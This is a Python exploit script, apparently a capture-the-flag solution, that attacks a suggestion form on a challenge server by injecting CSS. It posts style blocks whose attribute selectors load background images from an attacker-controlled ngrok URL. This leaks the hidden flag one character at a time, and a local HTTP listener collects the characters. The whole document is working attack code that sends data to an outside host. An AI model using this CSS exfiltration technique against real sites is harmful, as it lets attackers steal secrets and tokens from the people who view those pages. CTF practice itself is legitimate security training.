import requests, time, string
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import threading

attack_server = "http://63f33f23.ngrok.io/"
host = "http://challs.xmas.htsp.ro:11003/"

# Save possible chars to bruteforce
possible_chars = []
flag = []
global flag_round
flag_round = False

# HTTP server to listen for chars
class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    global possible_chars
    global flag
    global flag_round

    def do_GET(self):
        char = parse_qs(urlparse(self.path).query)
        if ( "char" in char.keys() ):
            possible_chars.append(char['char'][0])

        if ( "flag" in char.keys() ):
            flag.append(char['flag'][0])
        
        self.send_response(200)
        self.end_headers()
        
def start_server():
    httpd = HTTPServer(('localhost', 8000), SimpleHTTPRequestHandler)
    httpd.serve_forever()

print("Starting http server");
t1 = threading.Thread(target=start_server)
t1.start()

# Look for possible chars
print("Testing for possible chars");
for l in string.printable:
    payload = f'div.suggestion[value*="{l}"]{{background-image: url({attack_server}?char={l})}}\n'
    payload = f"<style>\n{payload}</style>"

    r = requests.post(host + "post_suggestion.php", data={"handle":"a", "captcha_code":"", "suggestion":payload})

    time.sleep(1)

# Now that all possible chars have been found time to bruteforce the flag
for _ in range(30):
    payload = ""
    ans = "".join(flag)
    for l in possible_chars:
        payload += f"div.suggestion[value^='{ans}{l}']{{background-image: url({attack_server}?flag={l})}}\n"

    payload = f"<style>\n{payload}</style>"

    r = requests.post(host + "post_suggestion.php", data={"handle":"a", "captcha_code":"", "suggestion":payload})

    print("".join(flag))
    time.sleep(2)


print(f"Flag: {''.join(flag)}")
